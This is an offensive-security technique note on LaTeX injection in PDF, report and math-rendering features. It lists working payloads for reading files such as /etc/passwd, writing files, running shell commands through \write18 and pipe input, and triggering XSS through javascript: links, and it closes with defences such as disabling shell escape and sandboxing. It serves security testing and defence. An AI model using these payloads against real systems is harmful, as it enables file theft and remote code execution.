---
title: "LaTeX Injection"
type: technique
tags: [command-injection, exploitation, file-read, injection, latex, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-latex]
---

# LaTeX Injection

## What it is

When an app compiles user-influenced LaTeX (PDF/report/invoice/resume generators, math rendering, academic platforms), the attacker abuses LaTeX's file and shell primitives to read/write files or get RCE. Related: [[os-command-injection]]; PDF generators also overlap [[headless-browser-attacks]].

## How it works / where found
Features that turn user input into a compiled PDF (`pdflatex`/`xelatex`) or render math: CV/invoice builders, exam/quiz platforms, wikis with math, "export to PDF". RCE needs `\write18` (shell-escape) enabled; file read/write often works even without it.

## File read
```latex
\input{/etc/passwd}
\usepackage{verbatim}\verbatiminput{/etc/passwd}
% line-by-line:
\newread\f \openin\f=/etc/passwd \loop\unless\ifeof\f \read\f to\l \text{\l}\repeat \closein\f
```
## File write
```latex
\newwrite\o \openout\o=cmd.tex \write\o{payload}\closeout\o
```
## Command execution (shell-escape)
```latex
\immediate\write18{id > out}\input{out}
\input|id                       % pipe form
\input{|"/bin/hostname"}
```
If `<`/`>` break compilation, base64-encode the command and decode in-doc, or use pipes.

## XSS (LaTeX rendered to HTML, e.g. MathJax)
```latex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{x}
\unicode{<img src=1 onerror=alert(1)>}
```

## Real-world
Online LaTeX/PDF and exam platforms have had file-read and `\write18` RCE bugs; a classic finding wherever user content reaches `pdflatex`. CTFs use it for `/etc/passwd`/flag reads.

## Detection and defence
Compile in **restricted/no-shell-escape mode** (`-no-shell-escape`, the default in most distros - never pass `-shell-escape` on untrusted input); run the compiler in a sandbox/container with no filesystem/network and a CPU/time limit; allowlist permitted commands/packages; strip dangerous primitives (`\input`, `\write18`, `\openin/out`, `\include`) from user input; prefer a safe math renderer (KaTeX) over full LaTeX where possible.

## Tools
Manual payloads; Burp to deliver the field. For the broader "render user input to PDF" SSRF/LFR surface see [[headless-browser-attacks]].

## Sources
- PayloadsAllTheThings - LaTeX Injection
